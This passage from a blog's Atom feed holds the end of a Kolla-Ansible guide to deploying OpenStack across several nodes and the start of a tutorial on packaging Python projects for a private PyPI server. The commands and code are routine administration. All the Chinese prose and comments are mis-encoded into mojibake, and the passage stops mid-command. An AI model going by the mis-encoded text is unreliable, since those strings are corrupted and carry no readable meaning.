This interface is what all your api services will be bound to by default.</span></span><br><span class="line"><span class="comment"># Additionally, all vxlan/tunnel and storage network traffic will go over this</span></span><br><span class="line"><span class="comment"># interface by default. This interface must contain an IP address.</span></span><br><span class="line"><span class="comment"># It is possible for hosts to have non-matching names of interfaces - these can</span></span><br><span class="line"><span class="comment"># be set in an inventory file per host or per group or stored separately, see</span></span><br><span class="line"><span class="comment">#     http://docs.ansible.com/ansible/intro_inventory.html</span></span><br><span class="line"><span class="comment"># Yet another way to workaround the naming problem is to create a bond for the</span></span><br><span class="line"><span class="comment"># interface on all hosts and give the bond name here. Similar strategy can be</span></span><br><span class="line"><span class="comment"># followed for other types of interfaces.</span></span><br><span class="line">network_interface: &quot;ens160&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the raw interface given to neutron as its external network port. Even</span></span><br><span class="line"><span class="comment"># though an IP address can exist on this interface, it will be unusable in most</span></span><br><span class="line"><span class="comment"># configurations. It is recommended this interface not be configured with any IP</span></span><br><span class="line"><span class="comment"># addresses for that reason.</span></span><br><span class="line">neutron_external_interface: &quot;ens192&quot; # ç©ºé—²ç½‘å¡</span><br><span class="line"></span><br><span class="line"><span class="comment"># Valid options are [ qemu, kvm, vmware ]</span></span><br><span class="line">nova_compute_virt_type: &quot;qemu&quot;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆéšæœºå¯†ç ï¼Œå¹¶æ‹·è´åˆ°å½“å‰ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯†ç </span></span><br><span class="line">kolla-genpwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´</span></span><br><span class="line">cp /etc/kolla/passwords.yml ~/passwords.yml</span><br></pre></td></tr></table></figure><p>éƒ¨ç½² OpenStack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bootstrap</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ bootstrap-servers</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ prechecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹‰å–é•œåƒ</span></span><br><span class="line"><span class="comment"># kolla-ansible -i ~/multinode --configdir ~ pull</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ deploy</span><br><span class="line"><span class="comment"># kolla-ansible -i ~/multinode --configdir ~ reconfigure</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²å¤±è´¥</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ destroy --yes-i-really-really-mean-it</span><br></pre></td></tr></table></figure><h1 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h1><p>åœ¨éƒ¨ç½²èŠ‚ç‚¹ä¸Šæ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œç”Ÿæˆèº«ä»½è®¤è¯æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… OpenStack CLI å®¢æˆ·ç«¯</span></span><br><span class="line">pip install python-openstackclient</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆè®¤è¯æ–‡ä»¶</span></span><br><span class="line">kolla-ansible -i ~/multinode --configdir ~ post-deploy</span><br><span class="line"></span><br><span class="line"><span class="comment"># èº«ä»½è®¤è¯</span></span><br><span class="line">. ~/admin-openrc.sh</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Kolla-Ansible è‡ªå¸¦çš„è„šæœ¬æµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰§è¡Œè„šæœ¬ç”Ÿæˆç¤ºä¾‹ç½‘ç»œã€é•œåƒã€å®ä¾‹ç­‰</span></span><br><span class="line">~/code/share/kolla-ansible/init-runonce</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®ä¾‹</span></span><br><span class="line">openstack server create \</span><br><span class="line">    --image cirros \</span><br><span class="line">    --flavor m1.tiny \</span><br><span class="line">    --key-name mykey \</span><br><span class="line">    --network demo-net \</span><br><span class="line">    demo1</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤å®ä¾‹çŠ¶æ€</span></span><br><span class="line">openstack server list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/31/RYBPvwHzVpFrm84.jpg" width="80%"><p>ç›´æ¥è®¿é—® <a href="http://10.111.1.250/">http://10.111.1.250</a> å¯ä»¥çœ‹åˆ°åˆšæ‰åˆ›å»ºçš„å®ä¾‹æ‰€å ç”¨çš„èµ„æº</p><ul><li>ç”¨æˆ·åå¯†ç æŸ¥çœ‹ admin-openrc.sh æ–‡ä»¶å³å¯</li></ul><p><img src="https://i.loli.net/2021/08/31/QFzHXR43DqjsdwO.png"></p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://github.com/Joxit/docker-registry-ui">Joxit/docker-registry-ui</a></li><li><a href="https://www.cnblogs.com/huangxincheng/p/11131623.html">8å¤©å…¥é—¨dockerç³»åˆ— â€”â€” ç¬¬å…­å¤© æ­å»ºè‡ªå·±çš„ç§æœ‰é•œåƒä»“åº“Registry</a></li><li><a href="https://docs.docker.com/registry/configuration/">Configuring a registry</a></li><li><a href="https://docs.openstack.org/kolla/latest/admin/image-building.html">Building Container Images</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/quickstart.html">Kolla-Ansible - Quick Start</a></li><li><a href="https://docs.openstack.org/kolla/latest/contributor/genconfig.html">Generating kolla-build.conf</a></li><li><a href="https://docs.openstack.org/kolla-ansible/latest/user/security.html">Kolla Security</a></li><li><a href="https://timonweb.com/devops/how-to-enable-passwordless-sudo-for-a-specific-user-in-linux/">How To Enable Passwordless Sudo For A Specific User in Linux</a></li><li><a href="https://blog.csdn.net/qq_28513801/article/details/116035363">ä½¿ç”¨kolla-ansibleéƒ¨ç½²å¤šèŠ‚ç‚¹OpenStack(Tç‰ˆ)åŠå¯¹æ¥Ceph</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ Kolla-Ansible çš„ multinode é…ç½®è¿œç¨‹éƒ¨ç½² OpenStack (Victoria)</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Python é¡¹ç›®æ‰“åŒ…å¹¶å‘å¸ƒåˆ°ç§æœ‰ PyPI æœåŠ¡å™¨</title>
    <link href="https://jckling.github.io/2021/08/23/Other/Python%20%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0%E7%A7%81%E6%9C%89%20PyPI%20%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://jckling.github.io/2021/08/23/Other/Python%20%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0%E7%A7%81%E6%9C%89%20PyPI%20%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-08-23T03:01:14.000Z</published>
    <updated>2022-03-08T09:03:12.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æäº†ä¸€ä¸ªæ–°éœ€æ±‚ï¼Œè¦æŠŠå¼€å‘çš„ Python é¡¹ç›®å‘å¸ƒåˆ° PyPI ä¸Šï¼Œä½†å› ä¸ºéœ€è¦ä¿å¯†ï¼Œæ‰€ä»¥å¾—è‡ªå·±æ­å»ºä¸€ä¸ªå†…éƒ¨çš„ PyPI æœåŠ¡å™¨ğŸ˜“</p><h1 id="Python-é¡¹ç›®æ‰“åŒ…"><a href="#Python-é¡¹ç›®æ‰“åŒ…" class="headerlink" title="Python é¡¹ç›®æ‰“åŒ…"></a>Python é¡¹ç›®æ‰“åŒ…</h1><h2 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h2><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªå¾…å‘å¸ƒçš„æ–‡ä»¶å¤¹ <code>packaging</code>ï¼Œæ•´ç†ä¸€ä¸‹é¡¹ç›®ç»“æ„å¹¶æ·»åŠ å‡ ä¸ªå¿…è¦çš„æ–‡ä»¶ï¼ˆ<code>LICENSE</code>ã€<code>README.md</code>ã€<code>setup.py</code>ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">packaging</span><br><span class="line">â”œâ”€â”€ my_project</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ module1</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ hello.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ module2</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ bye.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ utils.py</span><br><span class="line">â”œâ”€â”€ LICENSE</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â””â”€â”€ setup.py  <span class="comment"># æˆ– setup.cfg</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹å·¥ç¨‹å¾ˆç®€å•ï¼Œæ‰€æœ‰ <code>__init__.py</code> éƒ½æ˜¯ç©ºæ–‡ä»¶ï¼Œå…¶ä»–æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><ol><li><p>hello.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    print(<span class="string">&quot;hello world!&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>bye.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goodbye</span>():</span></span><br><span class="line">    print(<span class="string">&quot;goodbye!&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>utils.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&quot;A demo project for packaging.&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="é€‰æ‹©è®¸å¯è¯"><a href="#é€‰æ‹©è®¸å¯è¯" class="headerlink" title="é€‰æ‹©è®¸å¯è¯"></a>é€‰æ‹©è®¸å¯è¯</h2><p>PyPI è¦æ±‚æ‰€æœ‰ä¸Šä¼ çš„åŒ…éƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªè®¸å¯è¯ï¼Œåˆ©ç”¨ <a href="https://choosealicense.com/">https://choosealicense.com/</a> å¸®åŠ©é€‰æ‹©è®¸å¯è¯ï¼Œç„¶åå°†è®¸å¯è¯å†…å®¹å¤åˆ¶åˆ° <code>LICENSE</code> æ–‡ä»¶ä¸­ã€‚</p><p><em>æ³¨æ„æœ‰äº›è®¸å¯è¯éœ€è¦å¡«å…¥å¹´ä»½ï¼ˆ<code>[year]</code>ï¼‰å’Œæ‰€æœ‰è€…ï¼ˆ<code>[fullname]</code> æˆ– <code>[name of copyright owner]</code>ï¼‰</em></p><p>ä¾‹å¦‚ï¼ŒMIT è®¸å¯è¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">MIT License</span><br><span class="line"></span><br><span class="line">Copyright (c) [2021] [my_project]</span><br><span class="line"></span><br><span class="line">Permission is hereby granted, free of charge, to any person obtaining a copy</span><br><span class="line">of this software and associated documentation files (the &quot;Software&quot;), to deal</span><br><span class="line">in the Software without restriction, including without limitation the rights</span><br><span class="line">to use, copy, modify, merge, publish, distribute, sublicense, and&#x2F;or sell</span><br><span class="line">copies of the Software, and to permit persons to whom the Software is</span><br><span class="line">furnished to do so, subject to the following conditions:</span><br><span class="line"></span><br><span class="line">The above copyright notice and this permission notice shall be included in all</span><br><span class="line">copies or substantial portions of the Software.</span><br><span class="line"></span><br><span class="line">THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span><br><span class="line">IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span><br><span class="line">FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span><br><span class="line">AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span><br><span class="line">LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span><br><span class="line">OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span><br><span class="line">SOFTWARE.</span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™è¯´æ˜"><a href="#ç¼–å†™è¯´æ˜" class="headerlink" title="ç¼–å†™è¯´æ˜"></a>ç¼–å†™è¯´æ˜</h2><p>æ ¹æ® markdown è¯­æ³•ç¼–å†™é¡¹ç›®çš„è¯¦ç»†è¯´æ˜ï¼Œä¹‹åå¯ä»¥ä½œä¸º <code>setup.py</code> ä¸­çš„ <code>long_description</code> é¡¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Example Package</span><br><span class="line"></span><br><span class="line">This is a simple example package. You can use</span><br><span class="line">[Github-flavored Markdown](https:&#x2F;&#x2F;guides.github.com&#x2F;features&#x2F;mastering-markdown&#x2F;)</span><br><span class="line">to write your content.</span><br></pre></td></tr></table></figure><h2 id="é…ç½®å…ƒæ•°æ®"><a href="#é…ç½®å…ƒæ•°æ®" class="headerlink" title="é…ç½®å…ƒæ•°æ®"></a>é…ç½®å…ƒæ•°æ®</h2><p>æœ‰ä¸¤ç§å…ƒæ•°æ®ç±»å‹ï¼šé™æ€å…ƒæ•°æ®ï¼ˆ<code>setup.cfg</code>ï¼‰å’ŒåŠ¨æ€å…ƒæ•°æ®ï¼ˆ<code>setup.py</code>ï¼‰ï¼Œå®˜æ–¹æ¨èé¦–é€‰é™æ€å…ƒæ•°æ®ã€‚</p><h3 id="é™æ€"><a href="#é™æ€" class="headerlink" title="é™æ€"></a>é™æ€</h3><p>ä¸‹é¢æ˜¯å®˜æ–¹ç¤ºä¾‹çš„ <code>setup.cfg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[metadata]</span><br><span class="line">name &#x3D; example-pkg-YOUR-USERNAME-HERE</span><br><span class="line">version &#x3D; 0.0.1</span><br><span class="line">author &#x3D; Example Author</span><br><span class="line">author_email &#x3D; author@example.com</span><br><span class="line">description &#x3D; A small example package</span><br><span class="line">long_description &#x3D; file: README.md</span><br><span class="line">long_description_content_type &#x3D; text&#x2F;markdown</span><br><span class="line">url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;sampleproject</span><br><span class="line">project_urls &#x3D;</span><br><span class="line">    Bug Tracker &#x3D; https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;sampleproject&#x2F;issues</span><br><span class="line">classifiers &#x3D;</span><br><span class="line">    Programming Language :: Python :: 3</span><br><span class="line">    License :: OSI Approved :: MIT License</span><br><span class="line">    Operating System :: OS Independent</span><br><span class="line"></span><br><span class="line">[options]</span><br><span class="line">package_dir &#x3D;</span><br><span class="line">    &#x3D; src</span><br><span class="line">packages &#x3D; find:</span><br><span class="line">python_requires &#x3D; &gt;&#x3D;3.6</span><br><span class="line"></span><br><span class="line">[options.packages.find]</span><br><span class="line">where &#x3D; src</span><br></pre></td></tr></table></figure><table><thead><tr><th>å­—æ®µåç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>name</code></td><td>å¦‚æœè¦å‘å¸ƒåœ¨ pypi.org ä¸Šï¼Œåç§°å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œåªèƒ½ç”±è‹±æ–‡å­—æ¯ã€<code>_</code>ã€<code>-</code> ç»„æˆ</td></tr><tr><td><code>author</code>ã€<code>author_email</code></td><td>æ ‡è¯†ä½œè€…</td></tr><tr><td><code>description</code></td><td>åŒ…çš„ç®€çŸ­ä»‹ç»</td></tr><tr><td><code>long_description</code></td><td>åŒ…çš„è¯¦ç»†ä»‹ç»ï¼Œå¯ä»¥æŒ‡å®šè¯´æ˜æ–‡ä»¶</td></tr><tr><td><code>url</code></td><td>é¡¹ç›®ä¸»é¡µ</td></tr><tr><td><code>project_urls</code></td><td>å’Œé¡¹ç›®ç›¸å…³çš„é¢å¤–é“¾æ¥</td></tr><tr><td><code>classifiers</code></td><td>é™„åŠ å…ƒæ•°æ®ï¼Œä¾‹å¦‚è®¸å¯è¯ã€å…¼å®¹ã€‚å®Œæ•´åˆ—è¡¨è§ <a href="https://pypi.org/classifiers/">https://pypi.org/classifiers/</a></td></tr></tbody></table><h3 id="åŠ¨æ€"><a href="#åŠ¨æ€" class="headerlink" title="åŠ¨æ€"></a>åŠ¨æ€</h3><p>å®˜æ–¹ç¤ºä¾‹çš„ <code>setup.py</code>ï¼Œå¯ä»¥çœ‹å‡ºå­—æ®µåŸºæœ¬æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ç°æˆçš„æ¨¡æ¿è¿›è¡Œç¼–å†™ï¼š<a href="https://github.com/kennethreitz/setup.py/blob/master/setup.py">kennethreitz/setup.py</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">    long_description = fh.read()</span><br><span class="line"></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">&quot;example-pkg-YOUR-USERNAME-HERE&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    author=<span class="string">&quot;Example Author&quot;</span>,</span><br><span class="line">    author_email=<span class="string">&quot;author@example.com&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">    long_description=long_description,</span><br><span class="line">    long_description_content_type=<span class="string">&quot;text/markdown&quot;</span>,</span><br><span class="line">    url=<span class="string">&quot;https://github.com/pypa/sampleproject&quot;</span>,</span><br><span class="line">    project_urls=&#123;</span><br><span class="line">        <span class="string">&quot;Bug Tracker&quot;</span>: <span class="string">&quot;https://github.com/pypa/sampleproject/issues&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    package_dir=&#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;src&quot;</span>&#125;,</span><br><span class="line">    packages=setuptools.find_packages(where=<span class="string">&quot;src&quot;</span>),</span><br><span class="line">    python_requires=<span class="string">&quot;&gt;=3.6&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œå¯ä»¥æŠŠ <code>setup.cfg</code> ç†è§£ä¸ºåŒ…å« <code>setup.py</code> å‘½ä»¤é»˜è®¤é€‰é¡¹çš„ ini æ–‡ä»¶ã€‚</p><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>Ubuntu 20.04 Serverï¼ˆPython 3.8.10ï¼‰å®‰è£… <code>venv</code>ï¼Œåˆ›å»ºå¹¶ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv /home/jck/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> /home/jck/code/bin/activate</span><br></pre></td></tr></table></figure><h2 id="ç”ŸæˆåŒ…"><a href="#ç”ŸæˆåŒ…" class="headerlink" title="ç”ŸæˆåŒ…"></a>ç”ŸæˆåŒ…</h2><p>ä½¿ç”¨ä»¥ä¸‹ <code>setup.py</code> é…ç½®æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">    long_description = fh.read()</span><br><span class="line"></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">&quot;my_project&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    author=<span class="string">&quot;jckling&quot;</span>,</span><br><span class="line">    author_email=<span class="string">&quot;jckling@163.com&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">    long_description=long_description,</span><br><span class="line">    long_description_content_type=<span class="string">&quot;text/markdown&quot;</span>,</span><br><span class="line">    url=<span class="string">&quot;https://github.com/jckling&quot;</span>,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    packages=setuptools.find_packages(),</span><br><span class="line">    python_requires=<span class="string">&quot;&gt;=3.6&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å®‰è£… <code>setuptools</code> å’Œ <code>wheel</code>ï¼Œæ”¯æŒä»æºç æ„å»ºåŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install setuptools</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>è¿›å…¥ packaging æ–‡ä»¶å¤¹ï¼Œæ£€æŸ¥ <code>setup.py</code>ï¼Œå¦‚æœæœ‰é”™è¯¯ä¼šæ‰“å°æç¤ºä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python setup.py check</span><br><span class="line"><span class="comment"># running check</span></span><br></pre></td></tr></table></figure><p>æ‰“åŒ…ï¼Œè‡ªåŠ¨åˆ›å»º <code>dist</code> ç›®å½•ï¼Œä»¥åŠç›¸åº”çš„ <code>.tar.gz</code> æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py sdist build</span><br></pre></td></tr></table></figure><script id="asciicast-Bhy00w92CAhOkpHz8o11aOpVL" src="https://asciinema.org/a/Bhy00w92CAhOkpHz8o11aOpVL.js" async></script><h1 id="æœ¬åœ°-PyPI-æœåŠ¡å™¨æ­å»º"><a href="#æœ¬åœ°-PyPI-æœåŠ¡å™¨æ­å»º" class="headerlink" title="æœ¬åœ° PyPI æœåŠ¡å™¨æ­å»º"></a>æœ¬åœ° PyPI æœåŠ¡å™¨æ­å»º</h1><h2 id="æ­å»ºæœåŠ¡å™¨"><a href="#æ­å»ºæœåŠ¡å™¨" class="headerlink" title="æ­å»ºæœåŠ¡å™¨"></a>æ­å»ºæœåŠ¡å™¨</h2><p>å®‰è£… <code>pypiserver</code>ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹ <code>packages</code> ç”¨äºæ”¾ç½®å‘å¸ƒçš„åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pypiserver</span><br><span class="line">mkdir ~/packages</span><br></pre></td></tr></table></figure><p>å°† <code>my_project-0.0.1.tar.gz</code> ä¸Šä¼ åˆ° <code>~/packages</code> ç›®å½•ä¸‹ï¼Œåœ¨åŒä¸€å°è™šæ‹Ÿæœºä¸Šæ“ä½œç›´æ¥ä½¿ç”¨ <code>mv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv dist/my_project-0.0.1.tar.gz 